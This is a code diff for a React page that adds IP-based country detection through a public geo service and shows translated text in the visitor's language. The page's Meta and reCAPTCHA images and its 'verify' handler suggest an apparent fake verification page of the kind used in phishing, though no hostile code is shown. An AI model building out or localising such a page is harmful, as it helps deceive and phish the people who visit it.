@@ -2,16 +2,35 @@
 import CheckMarkImage from '@/assets/images/checkmark.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ReCaptchaImage from '@/assets/images/recaptcha.png';
-import { useTranslation } from '@/utils/use-translation';
+import { getTranslations, COUNTRY_TO_LANGUAGE } from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
 import { useRouter } from 'next/navigation';
 import { useEffect, useState, type FC } from 'react';
 const Index: FC = () => {
     const router = useRouter();
-    const { t } = useTranslation();
     const [isLoading, setIsLoading] = useState(false);
     const [isShowCheckMark, setisShowCheckMark] = useState(false);
+    const [translations, setTranslations] = useState<Record<string, string>>({});
+
+    // Inline geo-detection + translation
+    useEffect(() => {
+        const init = async () => {
+            try {
+                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
+                const cc = (data.country_code || 'US').toLowerCase();
+                const lang = COUNTRY_TO_LANGUAGE[cc] || 'en';
+                if (lang !== 'en') {
+                    setTranslations(getTranslations(lang) || {});
+                }
+            } catch {
+                // fallback to English
+            }
+        };
+        init();
+    }, []);
+
+    const t = (text: string): string => translations[text] || text;
     const handleVerify = async () => {
         setIsLoading(true);
         try {
